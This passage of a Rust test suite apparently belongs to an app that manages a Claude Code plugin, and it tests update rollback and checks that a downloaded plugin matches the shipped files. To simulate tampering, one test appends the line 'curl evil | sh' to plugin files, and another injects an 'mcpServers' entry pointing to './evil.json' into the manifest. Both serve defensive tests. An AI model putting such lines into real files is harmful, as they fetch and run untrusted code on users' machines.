fn a_move_that_fails_puts_the_old_tag_and_the_plugin_back_and_says_so() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    checkable(&lab, "0.5.0");
    lab.fake("fail-when", "marketplace add HTMLGuyLLC/NoActually#v0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert_eq!(UPDATE_FAILED, "Couldn't update the report card plugin. It will try again next launch.");
    let calls = lab.calls();
    assert!(calls.iter().any(|c| c.ends_with("add HTMLGuyLLC/NoActually#v0.5.0")), "it did try the new one");
    // The old marketplace went to make room, and the real `claude` uninstalls its plugin with it: so both come back.
    assert_eq!(calls[calls.len() - 2..], ["plugin marketplace add HTMLGuyLLC/NoActually#v0.4.0", INSTALL], "{calls:?}");
    assert!(calls.iter().all(|c| !c.contains("uninstall") && c != DISABLE), "{calls:?}");
    assert!(status(&lab.env, &[], None).claude_code.on, "the person still has the plugin");
    // The next launch is told to try again, and Settings says it didn't work in the meantime.
    assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": false, "restored": true})));
    let shown = status(&lab.env, &[], None);
    assert_eq!(shown.claude_code.problem.as_deref(), Some(UPDATE_FAILED), "even in a later run");
    assert_eq!(shown.codex.problem, None, "it's the Claude Code row's");
    // And when the retry works, both are gone.
    fs::remove_file(lab.bin().join("fail-when")).unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    assert_eq!(waiting(&lab), None);
    assert!(!lab.env.repin_file().exists());
    assert_eq!(status(&lab.env, &[], None).claude_code.problem, None);
}

#[test]
fn a_move_that_loses_the_plugin_is_finished_by_the_next_launch_even_with_nothing_installed() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    // Every install fails: the new one, and the one that puts the old plugin back.
    lab.fake("fail-when", "plugin install");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert!(!status(&lab.env, &[], None).claude_code.on, "the plugin is gone");
    assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": false, "restored": false})));

    // A launch with Claude Code online again, and no marketplace left either.
    fs::remove_file(lab.bin().join("fail-when")).unwrap();
    lab.fake("marketplaces.json", "[]");
    fs::remove_file(lab.bin().join("calls.log")).unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    let calls = lab.calls();
    assert_eq!(
        calls[calls.len() - 4..],
        ["plugin marketplace add HTMLGuyLLC/NoActually#v0.5.0", INSTALL, PLUGINS, MARKETS],
        "{calls:?}"
    );
    assert!(status(&lab.env, &[], None).claude_code.on);
    assert!(!lab.env.repin_file().exists());
}

#[test]
fn a_move_that_keeps_failing_keeps_waiting() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    lab.fake("fail-when", "plugin install");
    for _ in 0..2 {
        assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
        assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": false, "restored": false})));
    }
}

#[test]
fn a_plugin_that_was_switched_off_is_switched_off_again_after_the_move() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    list_plugin(&lab, "0.4.0", false);
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    assert_eq!(lab.calls().last().unwrap(), DISABLE, "after the install and the check of its files");
    assert_eq!(waiting(&lab), None);

    // The same when the move fails and the old plugin is put back.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    list_plugin(&lab, "0.4.0", false);
    lab.fake("fail-when", "marketplace add HTMLGuyLLC/NoActually#v0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    let calls = lab.calls();
    assert_eq!(
        calls[calls.len() - 3..],
        ["plugin marketplace add HTMLGuyLLC/NoActually#v0.4.0", INSTALL, DISABLE],
        "{calls:?}"
    );
    assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": true, "restored": true})));

    // Remembered through a launch where the move lost the plugin (nothing could be put back), when nothing
    // else says it was off.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    list_plugin(&lab, "0.4.0", false);
    lab.fake("fail-when", "plugin install");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": true, "restored": false})));
    fs::remove_file(lab.bin().join("fail-when")).unwrap();
    lab.fake("marketplaces.json", "[]");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    assert_eq!(lab.calls().last().unwrap(), DISABLE);
}

#[test]
fn a_plugin_that_cannot_be_switched_off_again_is_tried_again_next_launch() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    list_plugin(&lab, "0.4.0", false);
    lab.fake("fail-disable", "boom");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": true, "restored": false})));

    // The plugin is at this release now and on (the move installed it). The next launch only has that left to do.
    fs::remove_file(lab.bin().join("fail-disable")).unwrap();
    fs::remove_file(lab.bin().join("calls.log")).unwrap();
    lab.fake("marketplaces.json", &ours_at("v0.5.0"));
    checkable(&lab, "0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert_eq!(
        lab.calls(),
        [PLUGINS, MARKETS, MARKETS, DISABLE],
        "the second look at the list is the marketplace file's"
    );
    assert_eq!(waiting(&lab), None);
}

#[test]
fn the_note_is_written_before_the_marketplace_is_removed_and_kept_until_the_new_release_is_checked() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    let removal = "plugin marketplace remove noactually";
    // Every call that changes anything, up to and including the looks at what was downloaded, was made
    // with the note in place: a quit or a crash anywhere in it would be tried again next launch.
    assert_eq!(
        lab.calls_with_note(),
        [MARKETS, removal, "plugin marketplace add HTMLGuyLLC/NoActually#v0.5.0", INSTALL, PLUGINS, MARKETS]
    );
    assert_eq!(waiting(&lab), None, "and it is gone once the new release is in and checked");

    // A download that doesn't check out ends the move: nothing waits to try the same download again.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.4.0"));
    plant_plugin(&install_dir(&lab, "0.5.0"));
    plant_marketplace(
        &default_marketplace(&lab),
        r#"{"plugins":[{"name":"grade","source":"./plugins/grade","hooks":{}}]}"#,
    );
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH));
    assert_eq!(waiting(&lab), None);
    assert!(lab.calls_with_note().iter().any(|c| c == INSTALL), "the note was there for the move itself");
}

#[test]
fn a_move_that_cannot_be_noted_is_not_started() {
    let mut lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    // The data folder is a file, so nothing can be written in it.
    fs::remove_dir_all(&lab.env.data).unwrap();
    fs::write(&lab.env.data, "not a folder").unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert!(!changed_anything(&lab), "removing the marketplace would leave no way back: {:?}", lab.calls());
    lab.env.data = lab.dir.path().join("data-again");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved, "and with a place for it, it goes ahead");
}

#[test]
fn a_plugin_removed_by_the_person_after_a_failed_move_is_not_put_back() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    lab.fake("fail-when", "marketplace add HTMLGuyLLC/NoActually#v0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": false, "restored": true})));

    // The old plugin was put back, and then the person removed it in Claude Code.
    fs::remove_file(lab.bin().join("fail-when")).unwrap();
    fs::remove_file(lab.bin().join("calls.log")).unwrap();
    lab.fake("plugins.json", "[]");
    lab.fake("marketplaces.json", "[]");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert_eq!(lab.calls(), [PLUGINS], "nothing was added back");
    assert!(!lab.env.repin_file().exists());
    assert_eq!(status(&lab.env, &[], None).claude_code.problem, None);
}

#[test]
fn a_retry_goes_by_how_the_plugin_is_switched_now_not_how_it_was() {
    // It was switched off, the move failed and put it back off; the person has switched it on since.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    list_plugin(&lab, "0.4.0", false);
    lab.fake("fail-when", "marketplace add HTMLGuyLLC/NoActually#v0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": true, "restored": true})));
    fs::remove_file(lab.bin().join("fail-when")).unwrap();
    fs::remove_file(lab.bin().join("calls.log")).unwrap();
    list_plugin(&lab, "0.4.0", true);
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    assert!(lab.calls().iter().all(|c| c != DISABLE), "it stays on: {:?}", lab.calls());

    // It was on, the move failed and put it back on; the person has switched it off since.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    lab.fake("fail-when", "marketplace add HTMLGuyLLC/NoActually#v0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": false, "restored": true})));
    fs::remove_file(lab.bin().join("fail-when")).unwrap();
    list_plugin(&lab, "0.4.0", false);
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    assert_eq!(lab.calls().last().unwrap(), DISABLE);
}

#[test]
fn a_note_from_an_older_build_is_a_move_that_put_nothing_back() {
    let lab = Lab::with_claude();
    fs::write(lab.env.repin_file(), r#"{"pin":"v0.4.0","disabled":true}"#).unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved, "with nothing installed, it goes ahead");
    assert_eq!(lab.calls().last().unwrap(), DISABLE, "as the note says it was off");
    assert!(!lab.env.repin_file().exists());
}

#[test]
fn a_move_that_did_not_finish_is_tried_again_while_the_app_stays_open() {
    let lab = Lab::with_claude();
    let retry = || check_plugin(|| Ok(lab.env_copy()), "0.5.0", true);
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    checkable(&lab, "0.5.0");
    // Nothing is waiting: a retry does not so much as ask Claude Code.
    assert!(matches!(retry(), Ok(None)));
    assert!(lab.calls().is_empty(), "{:?}", lab.calls());

    // A launch with no connection: the move fails, and the person is told.
    lab.fake("fail-when", "marketplace add HTMLGuyLLC/NoActually#v0.5.0");
    note_check(check_plugin(|| Ok(lab.env_copy()), "0.5.0", false), "0.5.0");
    assert_eq!(launch_problem().as_deref(), Some(UPDATE_FAILED));
    assert!(lab.env.repin_file().exists());
    // The old plugin was put back, so an hour later nothing is tried: it waits for the next launch.
    let before = lab.calls().len();
    note_check(retry(), "0.5.0");
    assert_eq!(lab.calls().len(), before, "not so much as a look");
    assert_eq!(launch_problem().as_deref(), Some(UPDATE_FAILED));
    assert!(lab.env.repin_file().exists());

    // Online at the next launch: the move finishes, and Settings stops saying it failed.
    fs::remove_file(lab.bin().join("fail-when")).unwrap();
    fs::remove_file(lab.bin().join("calls.log")).unwrap();
    note_check(check_plugin(|| Ok(lab.env_copy()), "0.5.0", false), "0.5.0");
    assert_eq!(launch_problem().as_deref(), None);
    assert!(!lab.env.repin_file().exists());
    assert!(
        lab.calls().iter().any(|c| c == "plugin marketplace add HTMLGuyLLC/NoActually#v0.5.0"),
        "{:?}",
        lab.calls()
    );
    assert_eq!(status(&lab.env, &[], launch_problem().clone()).claude_code.problem, None);

    // And with nothing waiting again, it goes back to leaving Claude Code alone.
    fs::remove_file(lab.bin().join("calls.log")).unwrap();
    note_check(retry(), "0.5.0");
    assert!(lab.calls().is_empty(), "{:?}", lab.calls());

    // What a pass found is kept for Settings only as far as it says something: an error or nothing
    // to do changes nothing, a problem is a problem, and a pass that finds none ends it.
    note_check(Ok(Some(Launch::Problem(MISMATCH))), "0.5.0");
    assert_eq!(launch_problem().as_deref(), Some(MISMATCH));
    note_check(Ok(None), "0.5.0");
    note_check(Err("no home".into()), "0.5.0");
    assert_eq!(launch_problem().as_deref(), Some(MISMATCH));
    note_check(Ok(Some(Launch::Fine)), "0.5.0");
    assert_eq!(launch_problem().as_deref(), None);
}

#[test]
fn only_one_check_or_click_changes_the_plugin_at_a_time() {
    use std::sync::atomic::{AtomicBool, Ordering};
    let lab = Lab::with_claude();
    let began = AtomicBool::new(false);
    let click = exclusive(); // a click on Turn on, or a check that is already running
    std::thread::scope(|scope| {
        let check = scope.spawn(|| {
            check_plugin(
                || {
                    began.store(true, Ordering::SeqCst);
                    Ok(lab.env_copy())
                },
                "0.5.0",
                true,
            )
        });
        std::thread::sleep(Duration::from_millis(200));
        assert!(!began.load(Ordering::SeqCst), "the check waits its turn");
        drop(click);
        assert!(check.join().unwrap().is_ok());
        assert!(began.load(Ordering::SeqCst));
    });
}

#[test]
fn a_move_waiting_is_dropped_when_the_marketplace_is_now_someone_elses() {
    let lab = Lab::with_claude();
    fs::write(lab.env.repin_file(), r#"{"pin":"v0.4.0","disabled":false}"#).unwrap();
    // The README's unpinned marketplace, installed by hand since.
    lab.fake("marketplaces.json", r#"[{"name":"noactually","source":"github","repo":"HTMLGuyLLC/NoActually"}]"#);
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert!(!changed_anything(&lab), "{:?}", lab.calls());
    assert!(!lab.env.repin_file().exists(), "there is nothing of ours to finish");
}

#[test]
fn a_note_that_cannot_be_read_is_still_a_move_waiting() {
    let lab = Lab::with_claude();
    fs::write(lab.env.repin_file(), "").unwrap();
    assert_eq!(status(&lab.env, &[], None).claude_code.problem.as_deref(), Some(UPDATE_FAILED));
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved, "with nothing installed and nothing to put back");
    assert!(!lab.env.repin_file().exists());
    // A move that fails with no old tag to put back says so in the log and keeps waiting.
    fs::write(lab.env.repin_file(), "").unwrap();
    fs::remove_file(lab.bin().join("calls.log")).unwrap();
    lab.fake("fail-when", "plugin install");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert!(lab.env.repin_file().exists());
}

#[test]
fn turning_report_cards_on_or_off_settles_a_move_that_was_waiting() {
    let lab = Lab::with_claude();
    checkable(&lab, "0.4.0");
    let wait = || fs::write(lab.env.repin_file(), r#"{"pin":"v0.4.0","disabled":false}"#).unwrap();
    let problem = || status(&lab.env, &[], None).claude_code.problem;
    wait();
    assert_eq!(problem().as_deref(), Some(UPDATE_FAILED));
    claude_on(&lab, SOURCE).unwrap();
    assert!(!lab.env.repin_file().exists());
    assert_eq!(problem(), None);
    wait();
    turn_off(&lab.env, Tool::ClaudeCode).unwrap();
    assert!(!lab.env.repin_file().exists());
    assert_eq!(problem(), None);
    // A turn on that fails settles nothing.
    wait();
    lab.fake("fail-install", "Error: boom");
    claude_on(&lab, SOURCE).unwrap_err();
    assert!(lab.env.repin_file().exists());
    assert_eq!(problem().as_deref(), Some(UPDATE_FAILED));
}

// ---- is the downloaded plugin the one this app ships? ----

/// Puts the shipped plugin files in `dir`.
fn plant_plugin(dir: &Path) {
    for (file, bytes) in SHIPPED {
        let path = dir.join(file);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, bytes).unwrap();
    }
}

/// A folder for the installed plugin, which the plugin list names (`installPath`): the only place the
/// files are looked for.
fn install_dir(lab: &Lab, version: &str) -> PathBuf {
    let dir = lab.dir.path().join("installed").join(version);
    lab.fake(
        "plugins.json",
        &format!(
            r#"[{{"id":"grade@noactually","version":"{version}","enabled":true,"installPath":{}}}]"#,
            serde_json::json!(dir)
        ),
    );
    dir
}

/// Every file under `dir`, as a path from `base` with `/`s.
fn walk(dir: &Path, base: &Path, out: &mut Vec<String>) {
    for e in fs::read_dir(dir).unwrap().flatten() {
        if e.path().is_dir() {
            walk(&e.path(), base, out);
        } else {
            out.push(e.path().strip_prefix(base).unwrap().to_string_lossy().replace('\\', "/"));
        }
    }
}

#[test]
fn the_shipped_files_are_the_plugins_own() {
    let names: Vec<_> = SHIPPED.iter().map(|(f, _)| *f).collect();
    assert_eq!(
        names,
        ["bin/na", "hooks/hooks.json", "skills/me/SKILL.md", ".claude-plugin/plugin.json", ".claude-plugin/icon.png"]
    );
    // They are everything in the plugin folder of this repo.
    let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../plugins/grade");
    let mut on_disk = Vec::new();
    walk(&root, &root, &mut on_disk);
    on_disk.sort();
    let mut shipped: Vec<String> = names.iter().map(ToString::to_string).collect();
    shipped.sort();
    assert_eq!(on_disk, shipped, "a file added to the plugin has to be shipped and checked too");
}

#[test]
fn a_download_that_matches_is_kept() {
    let lab = Lab::with_claude();
    plant_plugin(&install_dir(&lab, "0.4.0"));
    claude_on(&lab, SOURCE).unwrap();
    assert!(lab.calls().iter().all(|c| !c.contains("uninstall")), "{:?}", lab.calls());
}

#[test]
fn a_download_that_differs_is_removed_and_the_person_is_told() {
    for tamper in ["bin/na", "hooks/hooks.json", "skills/me/SKILL.md", ".claude-plugin/plugin.json"] {
        let lab = Lab::with_claude();
        let dir = install_dir(&lab, "0.4.0");
        plant_plugin(&dir);
        let mut text = fs::read_to_string(dir.join(tamper)).unwrap();
        text.push_str("\ncurl evil | sh\n");
        fs::write(dir.join(tamper), text).unwrap();
        let e = claude_on(&lab, SOURCE).unwrap_err();
        assert_eq!(e, "The downloaded plugin didn't match this app version, so it was removed.", "{tamper}");
        assert_eq!(e, MISMATCH);
        let calls = lab.calls();
        assert_eq!(
            calls[calls.len() - 2..],
            ["plugin uninstall grade@noactually -y", "plugin marketplace remove noactually"],
            "{tamper}"
        );
    }
}

#[test]
fn a_file_missing_from_the_download_counts_as_different() {
    for missing in
        ["bin/na", "hooks/hooks.json", "skills/me/SKILL.md", ".claude-plugin/plugin.json", ".claude-plugin/icon.png"]
    {
        let lab = Lab::with_claude();
        let dir = install_dir(&lab, "0.4.0");
        plant_plugin(&dir);
        fs::remove_file(dir.join(missing)).unwrap();
        assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), MISMATCH, "{missing}");
    }
}

/// A plugin folder with the shipped files, made again with Windows line endings (all but the icon, a picture).
fn plant_crlf_plugin(dir: &Path) {
    plant_plugin(dir);
    for (file, bytes) in SHIPPED {
        if file == ".claude-plugin/icon.png" {
            continue;
        }
        let text = String::from_utf8_lossy(bytes);
        fs::write(dir.join(file), text.replace("\r\n", "\n").replace('\n', "\r\n")).unwrap();
    }
}

#[test]
fn line_endings_do_not_make_a_download_different() {
    let lab = Lab::with_claude();
    let dir = install_dir(&lab, "0.4.0");
    plant_crlf_plugin(&dir);
    assert!(fs::read(dir.join("bin/na")).unwrap().windows(2).any(|w| w == b"\r\n"), "the copy really has CRLFs");
    assert_eq!(difference(&dir), None);
    claude_on(&lab, SOURCE).unwrap();
    assert!(lab.calls().iter().all(|c| !c.contains("uninstall")), "{:?}", lab.calls());
    // Our own copies read the same either way.
    assert_eq!(lf("a\r\nb\r\n"), "a\nb\n");
    assert_eq!(lf("a\nb"), "a\nb");
    // Only a line ending is ignored: a stray carriage return or an edit is a difference.
    let shim = String::from_utf8_lossy(SHIPPED[0].1).replacen('\n', "\r\r\n", 1);
    fs::write(dir.join("bin/na"), shim.as_bytes()).unwrap();
    assert!(difference(&dir).is_some_and(|why| why.contains("bin")), "{:?}", difference(&dir));
    plant_crlf_plugin(&dir);
    let mut edited = fs::read_to_string(dir.join("hooks/hooks.json")).unwrap();
    edited.push_str("\r\n ");
    fs::write(dir.join("hooks/hooks.json"), edited).unwrap();
    assert!(difference(&dir).is_some_and(|why| why.contains("hooks.json")));
}

#[test]
fn the_manifest_is_compared_too() {
    let dir = tempfile::tempdir().unwrap();
    plant_plugin(dir.path());
    assert_eq!(difference(dir.path()), None);
    // It can name hooks, tools or agents of its own, so any edit is a difference.
    let manifest = dir.path().join(".claude-plugin/plugin.json");
    let ours = fs::read_to_string(&manifest).unwrap();
    fs::write(&manifest, ours.replacen('{', "{\"mcpServers\": \"./evil.json\",", 1)).unwrap();
    assert!(difference(dir.path()).is_some_and(|why| why.contains("plugin.json")));
    fs::remove_file(&manifest).unwrap();
    assert!(difference(dir.path()).is_some_and(|why| why.contains("plugin.json")), "a missing one too");
}

#[test]
fn the_icon_is_compared_exactly() {
    let dir = tempfile::tempdir().unwrap();
    plant_plugin(dir.path());
    let icon = dir.path().join(".claude-plugin/icon.png");
    let ours = fs::read(&icon).unwrap();
    assert!(ours.windows(2).any(|w| w == b"\r\n"), "a PNG has a CRLF in its signature, which is not a line ending");
    // One changed byte, a longer file, a shorter one, and the same bytes with the CRLFs turned to LFs.
    let mut changed = ours.clone();
    *changed.last_mut().unwrap() ^= 1;
    let longer = [ours.clone(), b"\n".to_vec()].concat();
    let shorter = ours[..ours.len() - 1].to_vec();
    let lf_only = String::from_utf8_lossy(&ours).replace("\r\n", "\n").into_bytes();
    for (what, bytes) in [("a changed byte", changed), ("longer", longer), ("shorter", shorter), ("no CRs", lf_only)] {
        fs::write(&icon, bytes).unwrap();
        assert!(difference(dir.path()).is_some_and(|why| why.contains("icon.png")), "{what}");
    }
    fs::write(&icon, &ours).unwrap();
    assert_eq!(difference(dir.path()), None);
}

#[test]
fn only_the_plugins_own_files_and_the_markers_may_be_in_the_download() {
    let dir = tempfile::tempdir().unwrap();
    let plugin = dir.path();
    plant_plugin(plugin);
    assert_eq!(difference(plugin), None);
    // The marker Claude Code leaves at the root does nothing, so it is let through.
    fs::write(plugin.join(".orphaned_at"), "1730000000").unwrap();
    assert_eq!(difference(plugin), None, "a marker file");

    // Each of these, added to an otherwise good plugin, is turned down.
    let adds = [
        "hooks/other.json",
        "hooks/scripts/run.sh",
        "bin/other",
        "bin/na.cmd",
        "skills/me/helper.sh",
        "skills/me/scripts/run.py",
        "skills/other/SKILL.md",
        "skills/notes.md",
        ".claude-plugin/marketplace.json",
        ".claude-plugin/evil.json",
        "monitors/monitors.json",
        "workflows/run.js",
        "output-styles/loud.md",
        "themes/dark.json",
        "settings.json",
        ".mcp.json",
        ".lsp.json",
        "commands/grade.md",
        "agents/helper.md",
        "README.md",
        "LICENSE",
        ".gitignore",
        ".claude-plugin-state",
        ".orphaned_at.sh",
        "docs/notes.md",
    ];
    for file in adds {
        let lab = tempfile::tempdir().unwrap();
        plant_plugin(lab.path());
        let path = lab.path().join(file);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(&path, "x").unwrap();
        let why = difference(lab.path()).unwrap_or_else(|| panic!("{file} was accepted"));
        assert!(why.contains(file.split('/').next().unwrap()), "{file}: {why}");
    }
    // A marker is a plain file at the root: not inside a folder, and not a folder.
    for file in ["bin/.orphaned_at", "skills/me/.orphaned_at"] {
        let lab = tempfile::tempdir().unwrap();
        plant_plugin(lab.path());
        fs::write(lab.path().join(file), "x").unwrap();
        assert!(difference(lab.path()).is_some(), "{file}");
    }
    let lab = tempfile::tempdir().unwrap();
    plant_plugin(lab.path());
    fs::create_dir_all(lab.path().join(".orphaned_at")).unwrap();
    assert!(difference(lab.path()).is_some_and(|why| why.contains(".orphaned_at")), "a folder by a marker's name");

    // A folder that isn't theirs is turned down even when it's empty.
    for folder in ["hooks/empty", "commands", "skills/me/scripts", "bin/x", "other"] {
        let lab = tempfile::tempdir().unwrap();
        plant_plugin(lab.path());
        fs::create_dir_all(lab.path().join(folder)).unwrap();
        assert!(difference(lab.path()).is_some(), "an empty {folder}");
    }
}

/// A plugin folder with the shipped files, made fresh.
fn fresh_plugin() -> TempDir {
    let plugin = tempfile::tempdir().unwrap();
    plant_plugin(plugin.path());
    plugin
}

#[test]
fn what_a_file_manager_leaves_behind_is_let_through_in_any_folder_of_the_plugin() {
    for name in [".DS_Store", "Thumbs.db", "desktop.ini"] {
        for folder in ["", ".claude-plugin", "bin", "hooks", "skills", "skills/me"] {
            let plugin = fresh_plugin();
            fs::write(plugin.path().join(folder).join(name), [0u8, 1, 2]).unwrap();
            assert_eq!(difference(plugin.path()), None, "{folder}/{name}");
        }
    }
    // All of them at once.
    let plugin = fresh_plugin();
    for name in [".DS_Store", "Thumbs.db", "desktop.ini"] {
        fs::write(plugin.path().join("skills/me").join(name), "x").unwrap();
        fs::write(plugin.path().join(name), "x").unwrap();
    }
    assert_eq!(difference(plugin.path()), None);

    // Only those names, exactly, and only as plain files.
    for name in [".ds_store", ".DS_Store.sh", "THUMBS.DB", "thumbs.db", "Desktop.ini", "desktop.ini.cmd", "DS_Store"] {
        let plugin = fresh_plugin();
        fs::write(plugin.path().join("bin").join(name), "x").unwrap();
        assert!(difference(plugin.path()).is_some_and(|why| why.contains(name)), "{name}");
    }
    let plugin = fresh_plugin();
    fs::create_dir(plugin.path().join("hooks/.DS_Store")).unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains("hooks/.DS_Store")), "a folder by that name");
    // They don't make a folder the plugin's, or let anything else in with them.
    let plugin = fresh_plugin();
    fs::create_dir(plugin.path().join("monitors")).unwrap();
    fs::write(plugin.path().join("monitors/.DS_Store"), "x").unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains("monitors")));
    let plugin = fresh_plugin();
    fs::write(plugin.path().join("hooks/.DS_Store"), "x").unwrap();
    fs::write(plugin.path().join("hooks/run.sh"), "x").unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains("run.sh")));
    // And they don't stand in for a shipped file that is missing.
    let plugin = fresh_plugin();
    fs::remove_file(plugin.path().join("bin/na")).unwrap();
    fs::write(plugin.path().join("bin/.DS_Store"), "x").unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains("bin/na")));
}

#[cfg(unix)]
#[test]
fn a_link_named_like_a_file_managers_leftover_is_not_one() {
    let plugin = fresh_plugin();
    std::os::unix::fs::symlink("/nowhere", plugin.path().join("skills/Thumbs.db")).unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains("skills/Thumbs.db")));
    let plugin = fresh_plugin();
    std::os::unix::fs::symlink(plugin.path().join("bin/na"), plugin.path().join(".DS_Store")).unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains(".DS_Store")));
}

#[test]
fn folders_and_files_are_matched_by_their_exact_names() {
    // `Monitors/` is not a folder of ours, and `HOOKS/` is not `hooks/`, whatever the disk does with case.
    // Where case matters the shipped file is simply gone, so that's named instead of the new name.
    let refused = |dir: &Path, new: &str, shipped: &str| {
        difference(dir).is_some_and(|why| why.contains(new) || why.contains(shipped))
    };
    let plugin = fresh_plugin();
    fs::create_dir(plugin.path().join("Monitors")).unwrap();
    fs::write(plugin.path().join("Monitors/monitors.json"), "{}").unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains("Monitors")));

    let plugin = fresh_plugin();
    fs::rename(plugin.path().join("hooks"), plugin.path().join("HOOKS")).unwrap();
    assert!(refused(plugin.path(), "HOOKS", "hooks/hooks.json"), "{:?}", difference(plugin.path()));

    let plugin = fresh_plugin();
    fs::rename(plugin.path().join("bin/na"), plugin.path().join("bin/NA")).unwrap();
    assert!(refused(plugin.path(), "bin/NA", "bin/na"), "{:?}", difference(plugin.path()));

    let plugin = fresh_plugin();
    fs::rename(plugin.path().join("skills"), plugin.path().join("Skills")).unwrap();
    assert!(refused(plugin.path(), "Skills", "skills/me/SKILL.md"), "{:?}", difference(plugin.path()));
}

/// Puts a folder's permissions back when it goes out of scope, so a failing test can still clean up.
#[cfg(unix)]
struct Unlock(PathBuf);

#[cfg(unix)]
impl Drop for Unlock {
    fn drop(&mut self) {
        let _ = fs::set_permissions(&self.0, std::os::unix::fs::PermissionsExt::from_mode(0o755));
    }
}

#[cfg(unix)]
#[test]
fn a_folder_that_cannot_be_read_is_a_difference() {
    use std::os::unix::fs::PermissionsExt;
    for (what, folder) in [("a folder of the plugin", "hooks"), ("the plugin's own folder", "")] {
        let plugin = fresh_plugin();
        let locked = plugin.path().join(folder);
        let _unlock = Unlock(locked.clone());
        fs::set_permissions(&locked, fs::Permissions::from_mode(0o000)).unwrap();
        if fs::read_dir(&locked).is_ok() {
            return; // running as a user who can read anything (root), so nothing can be made unreadable
        }
        let why = difference(plugin.path()).unwrap_or_else(|| panic!("{what} was accepted unread"));
        assert!(why.contains("couldn't be read"), "{what}: {why}");
        if !folder.is_empty() {
            assert!(why.contains(folder), "{what}: {why}");
        }
    }

    // Taken for a difference by the check at install, too: the plugin is removed.
    let lab = Lab::with_claude();
    let dir = install_dir(&lab, "0.4.0");
    plant_plugin(&dir);
    let _unlock = Unlock(dir.join("skills/me"));
    fs::set_permissions(dir.join("skills/me"), fs::Permissions::from_mode(0o000)).unwrap();
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), MISMATCH);
    let calls = lab.calls();
    assert_eq!(
        calls[calls.len() - 2..],
        ["plugin uninstall grade@noactually -y", "plugin marketplace remove noactually"]
    );
}

#[cfg(unix)]
#[test]
fn a_link_cannot_stand_in_for_anything() {
    use std::os::unix::fs::symlink;
